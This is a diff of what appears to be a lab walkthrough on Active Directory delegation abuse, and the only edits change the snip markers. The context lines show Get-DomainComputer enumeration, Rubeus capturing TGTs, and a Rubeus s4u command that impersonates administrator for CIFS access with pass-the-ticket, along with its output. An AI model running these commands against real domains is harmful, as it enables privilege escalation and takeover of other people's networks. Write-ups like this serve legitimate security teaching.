@@ -21,7 +21,7 @@ Get-DomainComputer
 
 ```console {class="sample-code"}
 PS C:\programdata> Get-DomainComputer
-...[SNIP]...
+---[SNIP]---
 
 logoncount                    : 131
 badpasswordtime               : 12/31/1600 4:00:00 PM
@@ -61,7 +61,7 @@ msds-supportedencryptiontypes : 28
 name                          : SRV002
 dnshostname                   : srv002.Example.local
 
-...[SNIP]...
+---[SNIP]---
 ```
 
 #### 2. SpoolSample
@@ -113,7 +113,7 @@ PS C:\programdata> .\rubeus.exe monitor /interval:1 /nowrap
   Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
   Base64EncodedTicket   :
 
-    doIFqjCCBa ...[SNIP]... guTE9DQUw=
+    doIFqjCCBa ---[SNIP]--- guTE9DQUw=
 
 
 [*] 11/23/2024 3:18:19 PM UTC - Found new TGT:
@@ -125,7 +125,7 @@ PS C:\programdata> .\rubeus.exe monitor /interval:1 /nowrap
   Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
   Base64EncodedTicket   :
 
-    doIFqjCCBa ...[SNIP]... guTE9DQUw=
+    doIFqjCCBa ---[SNIP]--- guTE9DQUw=
 
 
 [*] 11/23/2024 3:18:19 PM UTC - Found new TGT:
@@ -137,7 +137,7 @@ PS C:\programdata> .\rubeus.exe monitor /interval:1 /nowrap
   Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
   Base64EncodedTicket   :
 
-    doIFqjCCBa ...[SNIP]... guTE9DQUw=
+    doIFqjCCBa ---[SNIP]--- guTE9DQUw=
 
 [*] Ticket cache size: 3
 ```
@@ -149,7 +149,7 @@ PS C:\programdata> .\rubeus.exe monitor /interval:1 /nowrap
 ```
 
 ```console {class="sample-code"}
-PS C:\programdata> .\rubeus.exe s4u /impersonateuser:administrator /ticket:doIFqjCCBa...[SNIP]...guTE9DQUw= /altservice:cifs/srv001.example.local /self /ptt /nowrap
+PS C:\programdata> .\rubeus.exe s4u /impersonateuser:administrator /ticket:doIFqjCCBa---[SNIP]---guTE9DQUw= /altservice:cifs/srv001.example.local /self /ptt /nowrap
 
    ______        _                      
   (_____ \      | |                     
@@ -172,7 +172,7 @@ PS C:\programdata> .\rubeus.exe s4u /impersonateuser:administrator /ticket:doIFq
 [*] Got a TGS for 'administrator' to 'cifs@example.LOCAL'
 [*] base64(ticket.kirbi):
 
-      doIGMDCCBi...[SNIP]...5sb2NhbA==
+      doIGMDCCBi---[SNIP]---5sb2NhbA==
 
 [+] Ticket successfully imported!
 ```
